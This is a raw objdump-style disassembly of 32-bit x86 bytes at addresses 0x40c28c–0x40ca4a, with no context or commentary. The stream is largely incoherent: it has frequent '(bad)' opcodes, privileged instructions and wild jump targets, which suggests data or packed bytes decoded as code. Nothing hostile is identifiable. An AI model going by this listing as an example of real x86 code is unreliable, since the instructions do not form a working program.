  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
